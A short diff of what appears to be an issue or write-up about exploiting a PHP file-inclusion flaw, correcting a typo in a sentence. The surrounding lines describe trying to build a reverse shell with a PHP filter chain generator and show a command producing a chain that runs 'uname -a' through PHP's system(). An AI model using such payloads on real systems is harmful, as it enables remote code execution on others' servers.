@@ -43,7 +43,7 @@ Then i try to make a rev shell like this ```python php_filter_chain_generator.py
 
 but when i try it did not work becuse it's vary large payload
 
-i try to run tThenhe command directly like that php_filter_chain_generator.py --chain '<?php system("uname -a");?>' 
+i try to run command directly like that php_filter_chain_generator.py --chain '<?php system("uname -a");?>' 
 
 ![image](https://github.com/user-attachments/assets/9e8f4006-f965-40df-95f0-503971e9661e)
 
